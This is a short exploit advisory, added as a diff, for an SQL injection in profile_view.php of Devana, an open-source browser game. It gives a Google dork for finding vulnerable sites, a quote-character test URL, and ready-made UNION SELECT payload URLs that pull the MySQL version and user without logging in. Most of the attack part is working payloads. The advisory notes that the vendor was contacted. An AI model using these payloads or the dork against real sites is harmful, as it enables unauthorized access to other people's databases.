@@ -1,0 +1,48 @@
+# Exploit Title: Devana SQL Injection vulnerability
+# Date: 28.03.2010
+# Author: Valentin
+# Category: webapps/0day
+# Version: 
+# Tested on: Debian lenny, Apache2, MySQL5
+# CVE :  
+# Code : 
+
+
+
+:: General information
+:: Devana SQL injection vulnerability detected
+:: by Valentin Hoebel
+:: valentin@xenuser.org
+
+:: Product information
+:: Name = Devana
+:: Vendor = Busuioc Andrei / open source project
+:: Vendor Website = http://devana.eu/
+:: About the product = http://sourceforge.net/projects/devana/
+:: Affected versions = All, latest vulnerable version: 1.6.6
+:: Google dork: "Devana is an open source project !"
+
+
+:: SQL Injection vulnerability
+Devana is an open source browser game in which the player can choose between one of three factions and build an empire. Without being logged in, you have the possibility to view the profiles of other players, file: profile_view.php.
+Sadly Devana doesn't check the input so SQL injection is possible.
+There are currently seven other browser games being listed on sourceforge.net which are based on Devana. It is possible that they suffer from the same vulnerability.
+
+Vulnerable URL
+http://some-cool-domain.tld/profile_view.php?id=1
+
+Test URL
+http://some-cool-domain.tld/profile_view.php?id='
+
+Exploit vulnerability, e.g. by displaying the version of the MySQL server:
+http://some-cool-domain.tld/profile_view.php?id=1+AND+1=2+UNION+SELECT+1,2,concat(version()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+
+Or by displaying the current MySQL user:
+http://some-cool-domain.tld/profile_view.php?id=1+AND+1=2+UNION+SELECT+1,2,concat(user()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+--------------------------------------------------------------------------------------------------------
+
+
+:: Additional information
+:: Vendor contacted = 28.03.2010
+:: Vulnerability is expected to be fixed soon.
+:: Solution = Upgrade to new version when it is released.
